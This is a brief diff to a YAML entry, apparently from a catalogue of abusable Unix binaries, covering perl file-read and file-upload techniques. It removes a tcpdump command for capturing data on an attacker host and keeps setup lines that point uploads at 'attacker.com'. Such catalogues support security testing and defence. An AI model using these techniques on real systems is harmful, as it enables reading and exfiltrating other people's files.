@@ -7,7 +7,7 @@ functions:
         LFILE=file_to_read
         perl -ne print $LFILE
   file-upload:
-    - description: Send local file via "d" parameter of a HTTP POST request. Capture content on attacker host, example: `LPORT=8080; tcpdump -i any -s 0 -l -A "tcp dst port $LPORT and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)" | awk 'BEGIN { show=0 } /Connection: close/ { show=1; next } show'`
+    - description: Send local file via "d" parameter of a HTTP POST request.
       code: |
         export RHOST=attacker.com
         export RPORT=8080
